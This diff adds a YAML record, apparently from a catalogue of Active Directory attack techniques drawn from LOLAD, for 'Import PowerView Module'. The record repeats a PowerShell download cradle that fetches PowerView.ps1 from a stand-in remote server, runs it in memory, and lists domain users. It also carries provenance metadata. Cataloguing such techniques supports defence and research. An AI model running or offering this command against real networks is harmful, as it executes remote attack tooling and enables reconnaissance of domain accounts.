@@ -1,0 +1,83 @@
+id: lolad/SW1wb3J0IFBvd2VyVmlldyBNb2R1bGU/cG93ZXJzaGVsbCAtYyAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vcmVtb3Rlc2VydmVyL1Bvd2VyVmlldy5wczEnKTsgR2V0LU5ldFVzZXIi/UG93ZXJTaGVsbA
+type: technique
+platform: active-directory
+name: Import PowerView Module
+phases:
+- discovery
+capabilities:
+- discovery
+privilege_required: domain-user
+sources:
+- project: LOLAD
+  upstream_url: https://lolad-project.github.io
+  license: verify upstream LICENSE
+  upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+  last_synced: '2026-11-13'
+commands:
+- template: powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1');
+    Get-NetUser"
+references:
+- https://lolad-project.github.io
+tags:
+- active-directory
+- lolad
+- powershell
+source_data:
+  LOLAD:
+    raw:
+      name: Import PowerView Module
+      command: powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1');
+        Get-NetUser"
+      type: PowerShell
+      reference: PowerSploit - PowerView
+      physical_rows:
+      - input_ref: index.html#row=25
+        row_utf8: "<tr>\r\n\t\t\t<td>Import PowerView Module</td>\r\n\t\t\t<td><code>powershell -c \"\
+          IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1'); Get-NetUser\"\
+          </code></td>\r\n\t\t\t<td>PowerShell</td>\r\n\t\t\t<td><a href=\"https://github.com/PowerShellMafia/PowerSploit\"\
+          \ target=\"_blank\">PowerSploit - PowerView</a></td>\r\n\t\t</tr>"
+        row_sha256: sha256:5100907be2e9a088f2e15ec58426b4e29cdb39f73aa6dd8310fbaed3bc13ea9b
+        cells:
+        - Import PowerView Module
+        - powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1');
+          Get-NetUser"
+        - PowerShell
+        - PowerSploit - PowerView
+      physical_occurrence_count: 1
+    upstream_url: https://lolad-project.github.io
+    upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: discovery
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  phases:
+  - value: discovery
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLAD: sha256:8727770269c1fb1cc4e0aac888b97743d134de76db1ec377b516a9621906e6f2
